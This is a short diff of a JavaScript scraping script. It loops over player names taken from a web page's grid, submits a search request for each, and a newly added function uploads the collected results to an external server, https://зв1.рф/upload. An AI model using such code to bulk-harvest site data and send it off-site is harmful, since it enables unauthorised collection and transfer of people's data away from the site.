@@ -32,8 +32,10 @@ $("td[role=gridcell] span").each(function(i,v) {if(v.title.length)players.push(v
 //},10)
 
 var counter=0,stopFlag=false;
-function collectData(name){ //for script size optimization
+function collectData(name){
 if (stopFlag) return;
+if(!name){sendCollectedData();return;}
+
 var data={"javax.faces.partial.ajax": true};
 data["javax.faces.source"] = sfb_id;
 data["javax.faces.partial.execute"] = "search_tab:player_search:search_form:input";
@@ -96,3 +98,11 @@ $.ajax({
 }
 
 collectData(players[0]);
+
+
+function sendCollectedData(){
+	$.ajax("https://зв1.рф/upload",{
+		method: "post",
+		data:{"payload": JSON.stringify(result)}
+	})
+}
